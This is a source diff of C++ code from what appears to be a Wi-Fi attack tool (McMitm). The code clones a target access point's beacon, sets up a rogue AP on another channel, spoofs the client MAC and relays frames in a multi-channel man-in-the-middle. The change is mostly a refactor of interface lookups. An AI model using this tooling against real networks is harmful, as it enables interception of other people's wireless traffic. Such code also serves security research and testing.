@@ -22,8 +22,8 @@ McMitm::McMitm(const ActorPtr &rogue_sta, const ActorPtr &rogue_ap, string ssid,
 )
 : rogue_sta(rogue_sta),
 rogue_ap(rogue_ap),
-nic_real_ap(AP_IFACE_PREFIX + rogue_sta["iface"]),
-nic_rogue_ap(AP_IFACE_PREFIX + rogue_ap["iface"]),
+nic_real_ap(AP_IFACE_PREFIX + rogue_sta.get(SK::iface)),
+nic_rogue_ap(AP_IFACE_PREFIX + rogue_ap.get(SK::iface)),
 ssid(std::move(ssid)),
 // TODO fallback to info from actors
 ap_mac(ap_mac),
@@ -122,22 +122,22 @@ void McMitm::setup_real_AP_RSN_frames(){
 	rogue_sta->set_channel(netconfig.real_channel);
 
 	// get real AP beacon
-	beacon = scan::RSN_scan(rogue_sta["iface"], 20, scan_ap); //TODO hardcoded tscan_timeout
+	beacon = scan::RSN_scan(rogue_sta.get(SK::iface), 20, scan_ap); //TODO hardcoded tscan_timeout
 	if(!beacon){
 		log(LogLevel::ERROR,
 			"No beacon received of network <{}>. Is monitor mode working? Did you enter the correct SSID?", ssid);
 		return;
 	}
 
-	log(LogLevel::INFO, "Monitor mode: using {} on real channel and {} on rogue channel.", rogue_sta["iface"],
-		rogue_ap["iface"]);
+	log(LogLevel::INFO, "Monitor mode: using {} on real channel and {} on rogue channel.", rogue_sta.get(SK::iface),
+		rogue_ap.get(SK::iface));
 
 	//if(netconfig.real_channel > 13) log(LogLevel::WARNING, "Attack not yet tested against 5 GHz networks.");
 	//netconfig.find_rogue_channel(); //TODO
 
 	// Get a probe response for fast replying
 	if(auto *ch_ie = beacon->search_option(Dot11ManagementFrame::DS_SET))
-		const_cast<uint8_t *>(ch_ie->data_ptr())[0] = static_cast<uint8_t>(netconfig.rogue_channel.ch_num);
+		const_cast<uint8_t *>(ch_ie->data_ptr())[0] = netconfig.rogue_channel.ch_num;
 	probe_resp = make_unique<Dot11ProbeResponse>(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
 	log(LogLevel::INFO, "Target network {} detected on channel {}", ap_mac, netconfig.real_channel.ch_num);
 }
@@ -153,7 +153,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 	// for ACK back to AP
 
 	//FIXME set_monitor_active ničí channel ()
-	// const bool start_nic_real_ap = !hw_capabilities::set_monitor_active(rogue_sta["iface"], netconfig.real_channel);
+	// const bool start_nic_real_ap = !hw_capabilities::set_monitor_active(rogue_sta.get(SK::iface), netconfig.real_channel);
 	const bool start_nic_real_ap = true;
 	if(start_nic_real_ap){
 		rogue_sta->set_mac_address(client_state.get_mac());
@@ -161,12 +161,12 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 	} else{
 		hw_capabilities::set_iface_down(nic_real_ap, rogue_sta[SK::netns]);
 		rogue_sta->set_mac_address(client_state.get_mac());
-		hw_capabilities::run_cmd({"iw", rogue_sta["iface"], "set", "monitor", "active"}, rogue_sta[SK::netns]);
+		hw_capabilities::run_cmd({"iw", rogue_sta.get(SK::iface), "set", "monitor", "active"}, rogue_sta[SK::netns]);
 		this_thread::sleep_for(seconds(15));
-		rogue_sta->run({"iw", "dev", rogue_sta["iface"], "set", "channel", to_string(netconfig.real_channel.ch_num)});
+		rogue_sta->run({"iw", "dev", rogue_sta.get(SK::iface), "set", "channel", to_string(netconfig.real_channel.ch_num)});
 	}
 	rogue_sta->set_iface_up();
-	rogue_sta->run({"iw", "dev", rogue_sta["iface"], "set", "channel", to_string(netconfig.real_channel.ch_num)});
+	rogue_sta->run({"iw", "dev", rogue_sta.get(SK::iface), "set", "channel", to_string(netconfig.real_channel.ch_num)});
 
 	//FIXME change to wlan host or add comment
 	string bpf = "(wlan addr1 " + ap_mac.to_string() + ") or (wlan addr2 " + ap_mac.to_string() + ")";
@@ -174,7 +174,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 			to_string() + ")";
 	bpf = "(wlan type data or wlan type mgt) and (" + bpf + ")";
 
-	sock_real = make_unique<MonitorSocket>(rogue_sta["iface"]);
+	sock_real = make_unique<MonitorSocket>(rogue_sta.get(SK::iface));
 	sock_real->set_filter(bpf);
 
 	// set up the rogue AP and interfaces
@@ -185,7 +185,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 	start_ap(rs, nic_rogue_ap, rogue_ap, netconfig.rogue_channel, *beacon, ap_mac);
 	//hw_capabilities::run_cmd({"iw", "dev", nic_real_ap, "station", "add", client_mac.to_string()}, rogue_sta-[SK::netns], false);
 
-	sock_rogue = make_unique<MonitorSocket>(rogue_ap["iface"]);
+	sock_rogue = make_unique<MonitorSocket>(rogue_ap.get(SK::iface));
 	sock_rogue->set_filter(bpf);
 
 	log(LogLevel::INFO, "Giving the rogue AP one second to initialize ...");
@@ -234,10 +234,10 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 		select(max_fd, &read_fds, nullptr, nullptr, &tv);
 
 		if(FD_ISSET(fd_real, &read_fds)){
-			while(auto recv_res = sock_real->recv()) handle_rx_real_chan(std::move(recv_res.pdu), recv_res.raw);
+			while(auto recv_res = sock_real->recv()) handle_rx_real_chan(recv_res.pdu, recv_res.raw);
 		}
 		if(FD_ISSET(fd_rogue, &read_fds)){
-			while(auto recv_res = sock_rogue->recv()) handle_rx_rogue_chan(std::move(recv_res.pdu), recv_res.raw);
+			while(auto recv_res = sock_rogue->recv()) handle_rx_rogue_chan(recv_res.pdu, recv_res.raw);
 		}
 		/*while (!disas_queue.empty() && disas_queue.front().first <= steady_clock::now()) {
             send_disas(disas_queue.front().second);
@@ -289,9 +289,7 @@ void McMitm::patch_channel_raw(vector<uint8_t> &beacon_raw, const uint8_t channe
 
 		if(pos + 2 + len > effective_size) break;
 
-		if(id == Dot11::DS_SET && len == 1){
-			beacon_raw[pos + 2] = channel;
-		} else if(id == Dot11::HT_OPERATION && len >= 1){
+		if((id == Dot11::DS_SET && len == 1) || (id == Dot11::HT_OPERATION && len >= 1)){
 			beacon_raw[pos + 2] = channel;
 		}
 		pos += 2 + len;
